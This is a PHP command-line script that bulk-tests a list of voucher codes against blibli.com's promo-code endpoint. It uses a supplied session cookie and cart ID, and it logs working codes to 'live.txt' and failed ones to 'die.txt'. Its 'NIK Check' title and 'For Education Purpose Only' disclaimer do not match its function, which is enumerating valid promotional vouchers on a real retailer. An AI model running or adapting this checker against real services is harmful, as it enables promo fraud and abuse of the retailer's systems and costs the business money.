<?php
/*
NIK Check
Created By BeeCoder
For Education Purpose Only
*/

echo "Voucher : ";
$voucher = trim(fgets(STDIN));
print PHP_EOL.count(explode("\n",str_replace("\r", "", file_get_contents($voucher))))." VOUCHER";
$cart = file_get_contents("idcart.txt");
echo "Cart = $cart";
$cookie = file_get_contents("cookie.txt");
echo "Cookie = $cookie";
echo "\nchecking...\n";
foreach(explode(PHP_EOL, file_get_contents($voucher)) as $voucher)
{
    $check = check($voucher, $cart, $cookie);
    $data = json_decode($check, true);
    if($data["errorCode"] == "PRM_PROMO_CODE_NOT_FOUND" || $data["errorCode"] == "PRM_INVALID_STATUS_PROMO_CODE"){
        fwrite(fopen("die.txt", "a+"), "$voucher = ".$data["errorDesc"]."\n");
        echo $data["errorDesc"]."\n";
    } elseif ($data["errorCode"] == "PRM_INVALID_CUSTOMER_NOT_VERIFIED"){
        fwrite(fopen("live.txt", "a+"), "$voucher\n");
        echo "LIVE|$voucher\n";
    }
}

function check($voucher, $cart, $cookie){
    $curl = curl_init();

    curl_setopt_array($curl, array(
    CURLOPT_URL => "https://www.blibli.com/order/promocode",
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_ENCODING => "",
    CURLOPT_MAXREDIRS => 10,
    CURLOPT_TIMEOUT => 30,
    CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
    CURLOPT_CUSTOMREQUEST => "POST",
    CURLOPT_POSTFIELDS => "{\n\t\"taskType\" : \"A\",\n\t\"promoCode\" : \"$voucher\",\n\t\"pendingCartId\" : \"$cart\"\n}",
    CURLOPT_HTTPHEADER => array(
        "Accept: application/json",
        "Accept-Encoding: gzip, deflate",
        "Cache-Control: no-cache",
        "Connection: keep-alive",
        "Content-Length: 100",
        "Content-Type: application/json",
        "Cookie: $cookie",
        "Host: www.blibli.com",
        "Postman-Token: 479719f7-6f68-47e7-a24c-f4a9751d99f5,885adaa7-a6d9-45d8-aee0-b2914f5295a1",
        "User-Agent: PostmanRuntime/7.20.1",
        "cache-control: no-cache"
    ),
    ));

    $response = curl_exec($curl);
    $err = curl_error($curl);

    curl_close($curl);

    if ($err) {
        echo "cURL Error #:" . $err;
    } else {
        return $response;
    }
}
